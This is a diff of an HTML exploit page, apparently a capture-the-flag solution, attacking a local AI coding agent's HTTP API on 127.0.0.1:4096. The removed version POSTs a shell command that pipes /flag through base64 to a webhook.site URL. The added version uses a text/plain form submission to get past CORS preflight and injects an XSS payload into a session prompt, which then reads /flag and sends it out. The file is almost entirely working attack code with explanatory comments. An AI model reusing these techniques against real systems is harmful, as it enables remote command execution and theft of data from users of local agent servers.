@@ -1,23 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head><title>Debug Exploit</title></head>
 <body>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
-// 部署在 HTTP 页面上以避开协议阻断
-fetch('http://127.0.0.1:4096/session/default/shell', {
-    method: 'POST',
-    mode: 'no-cors', // 告诉浏览器：我不关心结果，只要把请求发出去就行
-    headers: {
-        'Content-Type': 'text/plain' // 简单请求，不触发预检
-    },
-    // 注意：payload 必须符合 opencode 的 JSON 格式要求
-    body: JSON.stringify({
-        "command": "chmod 444 /flag && curl https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4?f=$(cat /flag|base64)"
-    })
-}).then(() => {
-    console.log("请求已发出，请检查 Webhook");
-});
+        const WEBHOOK = "https://webhook.site/你的ID";
+        const LOCAL_UI = "http://127.0.0.1:4096";
+        const SESSION_ID = "default"; // 1.2.16 默认会话 ID
+
+        // 注入包含 XSS 的 Markdown 负载
+        // 这里的脚本会在 localhost 环境下运行，读取 flag 并外传
+        const xssPayload = `
+<img src=x onerror="
+    fetch('/file/content?path=/flag')
+    .then(r=>r.json())
+    .then(d=>fetch('${WEBHOOK}?flag='+btoa(d.content)))
+">`;
+
+        function doAttack() {
+            // 使用 Form 提交绕过 PNA/CORS 预检
+            const f = document.createElement('form');
+            f.action = `${LOCAL_UI}/session/${SESSION_ID}/prompt`;
+            f.method = 'POST';
+            f.enctype = 'text/plain';
+            
+            const i = document.createElement('input');
+            // 构造符合 API 要求的 JSON 格式，注意闭合
+            i.name = JSON.stringify({ "prompt": xssPayload });
+            i.value = "";
+            
+            f.appendChild(i);
+            document.body.appendChild(f);
+            
+            // 提交后，Bot 的浏览器会导航到 Web UI，渲染 XSS 并执行
+            f.submit();
+        }
+
+        // 延迟执行确保页面加载
+        setTimeout(doAttack, 1000);
     </script>
+    <h1>Loading Session...</h1>
 </body>
 </html>
